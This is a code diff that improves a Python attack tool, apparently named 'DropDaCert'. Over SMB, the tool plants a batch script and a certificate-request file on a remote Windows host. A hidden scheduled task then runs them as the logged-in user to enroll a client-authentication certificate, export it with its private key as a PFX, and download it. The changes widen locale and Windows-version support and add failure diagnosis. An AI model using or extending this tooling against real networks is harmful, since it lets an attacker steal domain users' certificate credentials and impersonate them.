@@ -72,28 +72,28 @@ except ImportError:
 
 CERT_INF = """\
 [Version]
-            Signature="$Windows NT$"
+Signature="$Windows NT$"
 
-            [NewRequest]
-            Subject = "CN={cn}"
-            KeySpec = 1
-            KeyLength = 2048
-            Exportable = TRUE
-            MachineKeySet = FALSE
-            SMIME = FALSE
-            PrivateKeyArchive = FALSE
-            UserProtected = FALSE
-            UseExistingKeySet = FALSE
-            ProviderName = "Microsoft RSA SChannel Cryptographic Provider"
-            ProviderType = 12
-            RequestType = PKCS10
-            KeyUsage = 0xa0
+[NewRequest]
+Subject = "CN={cn}"
+KeySpec = 1
+KeyLength = 2048
+Exportable = TRUE
+MachineKeySet = FALSE
+SMIME = FALSE
+PrivateKeyArchive = FALSE
+UserProtected = FALSE
+UseExistingKeySet = FALSE
+ProviderName = "Microsoft Strong Cryptographic Provider"
+ProviderType = 1
+RequestType = PKCS10
+KeyUsage = 0xa0
 
-            [EnhancedKeyUsageExtension]
-            OID=1.3.6.1.5.5.7.3.2
+[EnhancedKeyUsageExtension]
+OID=1.3.6.1.5.5.7.3.2
 
-            [RequestAttributes]
-            CertificateTemplate = {template}
+[RequestAttributes]
+CertificateTemplate = {template}
 """
 
 CERT_BAT = """\
@@ -101,7 +101,11 @@ CERT_BAT = """\
 setlocal enabledelayedexpansion
 set "BASE={drop_dir}\\{prefix}"
 
-certreq -new "%BASE%.inf" "%BASE%.req" >"%BASE%.log" 2>&1
+echo [%DATE% %TIME%] DropDaCert starting >"%BASE%.log"
+echo User: %USERNAME% Domain: %USERDOMAIN% >>"%BASE%.log"
+echo Session: %SESSIONNAME% >>"%BASE%.log" 2>&1
+
+certreq -new "%BASE%.inf" "%BASE%.req" >>"%BASE%.log" 2>&1
 if !ERRORLEVEL! neq 0 (echo FAIL_CERTREQ_NEW>"%BASE%.status" & exit /b 1)
 
 certreq -submit{ca_flag} "%BASE%.req" "%BASE%.cer" >>"%BASE%.log" 2>&1
@@ -119,10 +123,13 @@ if !ERRORLEVEL! neq 0 (echo FAIL_ADDSTORE>"%BASE%.status" & exit /b 1)
 
 :findhash
 set "HASH="
-for /f "tokens=2 delims=:" %%A in ('certutil -user -store my ^| findstr /r /c:"Hach\\. cert\\." /c:"Cert Hash"') do (
+for /f "tokens=2 delims=:" %%A in ('certutil -user -store my ^| findstr /r /c:"Cert Hash" /c:"Hach\\. cert\\." /c:"Zertifikathash" /c:"Hash de cert" /c:"Hash cert"') do (
     set "tmp=%%A"
     set "tmp=!tmp: =!"
-    set "HASH=!tmp!"
+    if not "!tmp!"=="" set "HASH=!tmp!"
+)
+if "!HASH!"=="" (
+    for /f %%H in ('powershell -NoP -C "(gci Cert:\\CurrentUser\\My^|sort NotBefore -Desc^|select -First 1).Thumbprint" 2^>nul') do set "HASH=%%H"
 )
 
 if "!HASH!"=="" (echo FAIL_NOHASH>"%BASE%.status" & exit /b 1)
@@ -156,10 +163,13 @@ set "BASE={drop_dir}\\{prefix}"
 certutil -user -addstore my "%BASE%.cer" >"%BASE%.log" 2>&1
 if !ERRORLEVEL! neq 0 (echo FAIL_ADDSTORE>"%BASE%.status" & exit /b 1)
 set "HASH="
-for /f "tokens=2 delims=:" %%A in ('certutil -user -store my ^| findstr /r /c:"Hach\\. cert\\." /c:"Cert Hash"') do (
+for /f "tokens=2 delims=:" %%A in ('certutil -user -store my ^| findstr /r /c:"Cert Hash" /c:"Hach\\. cert\\." /c:"Zertifikathash" /c:"Hash de cert" /c:"Hash cert"') do (
     set "tmp=%%A"
     set "tmp=!tmp: =!"
-    set "HASH=!tmp!"
+    if not "!tmp!"=="" set "HASH=!tmp!"
+)
+if "!HASH!"=="" (
+    for /f %%H in ('powershell -NoP -C "(gci Cert:\\CurrentUser\\My^|sort NotBefore -Desc^|select -First 1).Thumbprint" 2^>nul') do set "HASH=%%H"
 )
 if "!HASH!"=="" (echo FAIL_NOHASH>"%BASE%.status" & exit /b 1)
 certutil -user -repairstore my !HASH! >nul 2>&1
@@ -177,8 +187,9 @@ TASK_XML = """\
    </RegistrationTrigger>
 </Triggers>
 <Principals>
-   <Principal id="LocalSystem">
+   <Principal id="Author">
    <UserId>{domain}\\{username}</UserId>
+   <LogonType>InteractiveToken</LogonType>
    <RunLevel>HighestAvailable</RunLevel>
    </Principal>
 </Principals>
@@ -200,7 +211,7 @@ TASK_XML = """\
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
 </Settings>
-<Actions Context="LocalSystem">
+<Actions Context="Author">
    <Exec>
    <Command>{exec_cmd}</Command>
    <Arguments>{exec_args}</Arguments>
@@ -220,7 +231,7 @@ EXEC_METHODS = {
     },
     "powershell": {
         "cmd":  "powershell.exe",
-        "args": "-NonInteractive -WindowStyle Hidden -File {drop_dir}\\{prefix}.bat",
+        "args": "-NonInteractive -WindowStyle Hidden -Command \"cmd /c {drop_dir}\\{prefix}.bat\"",
     },
     "wscript": {
         "cmd":  "wscript.exe",
@@ -242,6 +253,42 @@ STATUS_MESSAGES = {
     "FAIL_EXPORT": "PFX export failed (key not exportable or store corruption)",
     "FAIL_ACCEPT": "certreq -accept failed (could not install CA response)",
 }
+
+
+def diagnose_failure(smb, drop_dir, prefix, exec_wrapper):
+    """Diagnose why cert enrollment failed by checking which files exist."""
+    req_exists = smb_file_exists(smb, drop_dir, f"{prefix}.req")
+    cer_exists = smb_file_exists(smb, drop_dir, f"{prefix}.cer")
+    status_text = smb_read_text(smb, drop_dir, f"{prefix}.status")
+    log_text = smb_read_text(smb, drop_dir, f"{prefix}.log")
+
+    print(flush=True)
+    warn("Diagnosis:")
+    if not req_exists:
+        warn("  cert.req NOT found — batch script never executed")
+        if exec_wrapper == "conhost":
+            warn("  conhost --headless requires Windows 10 1903+ / Server 2022+")
+            warn("  Retry with: --exec-wrapper cmd")
+        else:
+            warn("  The scheduled task may not have fired in the user's session")
+            warn("  Verify the target user has an active interactive logon (not just network)")
+    elif not cer_exists:
+        warn("  cert.req exists but cert.cer missing — certreq -submit failed")
+        warn("  Check: CA reachability from target, template permissions, CA config string")
+    else:
+        warn("  cert.cer exists but cert.pfx missing — PFX export failed")
+        warn("  Check: key exportability, DPAPI context (InteractiveToken), hash extraction")
+
+    if status_text:
+        msg = STATUS_MESSAGES.get(status_text, status_text)
+        warn(f"  Status file: {msg}")
+
+    if log_text:
+        warn("  cert.log contents:")
+        for line in log_text.strip().splitlines():
+            warn(f"    {line}")
+    elif not req_exists:
+        warn("  cert.log empty/missing — confirms batch never ran")
 
 
 # ── Output helpers ───────────────────────────────────────────────────────────
@@ -925,7 +972,7 @@ TSCH_HELPER_XML = """\
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <Hidden>true</Hidden>
-   <ExecutionTimeLimit>PT1M</ExecutionTimeLimit>
+   <ExecutionTimeLimit>PT5M</ExecutionTimeLimit>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
 </Settings>
@@ -1402,17 +1449,11 @@ def main():
                 result = "OK"
         if result != "OK":
             msg = STATUS_MESSAGES.get(result, result)
-            if result != "TIMEOUT":
+            if result == "TIMEOUT":
+                warn(f"Timed out after {args.timeout}s waiting for PFX")
+            else:
                 warn(f"Task failed: {msg}")
-            for ext in ("log", "status", "req", "cer"):
-                if smb_file_exists(smb, args.drop_dir, f"{args.prefix}.{ext}"):
-                    info(f"  {args.prefix}.{ext} exists on target")
-                    if ext == "log":
-                        log_text = smb_read_text(smb, args.drop_dir, f"{args.prefix}.log")
-                        if log_text:
-                            warn(f"cert.log contents:\n{log_text}")
-                else:
-                    info(f"  {args.prefix}.{ext} NOT found")
+            diagnose_failure(smb, args.drop_dir, args.prefix, args.exec_wrapper)
             if not args.no_cleanup:
                 if use_tsch:
                     try:
@@ -1427,7 +1468,7 @@ def main():
                 else:
                     cleanup_remote(transport, smb, args.task_name,
                                    args.drop_dir, args.prefix)
-            die("No PFX produced — check CA reachability and template permissions.")
+            die("No PFX produced — see diagnosis above.")
 
     # Download PFX
     os.makedirs(args.out_dir, exist_ok=True)
@@ -1513,9 +1554,9 @@ def parse_args():
     exc.add_argument("--exec-method", default="tsch",
         choices=["tsch", "winrm", "manual"],
         help="Command execution method: tsch (default, RPC via port 445), winrm, or manual (generate files only)")
-    exc.add_argument("--exec-wrapper", default="conhost",
+    exc.add_argument("--exec-wrapper", default="cmd",
         choices=list(EXEC_METHODS),
-        help="Bat execution wrapper: conhost|cmd|powershell|wscript (default: conhost)")
+        help="Bat execution wrapper: cmd (default, all Windows), conhost (Win10 1903+/Server 2022+), powershell, wscript")
     exc.add_argument("--download-method", default="smb",
         choices=["smb", "smbclient"],
         help="PFX download method (default: smb)")
